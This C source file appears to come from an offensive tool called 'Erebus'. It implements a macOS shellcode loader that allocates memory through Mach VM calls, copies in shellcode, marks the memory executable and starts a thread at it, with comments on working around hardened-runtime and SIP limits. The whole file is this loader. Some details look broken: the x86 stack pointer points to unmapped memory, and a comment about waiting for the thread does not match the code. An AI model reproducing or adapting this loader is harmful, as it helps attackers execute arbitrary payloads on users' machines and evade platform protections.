#include <string.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include "../../include/injection.h"

/*
 * Allocate executable memory in the current task via the Mach VM subsystem,
 * copy the shellcode, then spawn a new Mach thread at the shellcode entry.
 *
 * Using mach_task_self() keeps this strictly self-injection - no
 * task_for_pid entitlement or SIP exception required.
 *
 * arm64 note: vm_protect with VM_PROT_EXECUTE on Apple Silicon requires
 * either the com.apple.security.cs.allow-jit entitlement or a SIP-disabled
 * system.  For hardened-runtime targets prefer mmap_pthread (injection type 1).
 */
void erebus_mach_thread(const unsigned char *sc, size_t sc_len)
{
    mach_port_t task = mach_task_self();

    mach_vm_address_t remote_mem = 0;
    kern_return_t kr;

    kr = mach_vm_allocate(task, &remote_mem, sc_len, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) return;

    kr = mach_vm_protect(task, remote_mem, sc_len, FALSE,
                         VM_PROT_READ | VM_PROT_WRITE);
    if (kr != KERN_SUCCESS) { mach_vm_deallocate(task, remote_mem, sc_len); return; }

    kr = mach_vm_write(task, remote_mem, (vm_offset_t)sc, (mach_msg_type_number_t)sc_len);
    if (kr != KERN_SUCCESS) { mach_vm_deallocate(task, remote_mem, sc_len); return; }

    kr = mach_vm_protect(task, remote_mem, sc_len, FALSE,
                         VM_PROT_READ | VM_PROT_EXECUTE);
    if (kr != KERN_SUCCESS) { mach_vm_deallocate(task, remote_mem, sc_len); return; }

    thread_act_t thread;

#if defined(__arm64__) || defined(__aarch64__)
    arm_thread_state64_t state;
    memset(&state, 0, sizeof(state));
    arm_thread_state64_set_pc_fptr(state, (void *)remote_mem);

    kr = thread_create_running(task, ARM_THREAD_STATE64,
                               (thread_state_t)&state,
                               ARM_THREAD_STATE64_COUNT, &thread);
#else
    x86_thread_state64_t state;
    memset(&state, 0, sizeof(state));
    state.__rip = (uint64_t)remote_mem;
    state.__rsp = state.__rip + sc_len + 0x1000; /* scratch stack */

    kr = thread_create_running(task, x86_THREAD_STATE64,
                               (thread_state_t)&state,
                               x86_THREAD_STATE64_COUNT, &thread);
#endif

    if (kr == KERN_SUCCESS) {
        /* Wait for the thread to finish by joining via mach_thread_wait. */
        mach_port_deallocate(mach_task_self(), thread);
    }
}
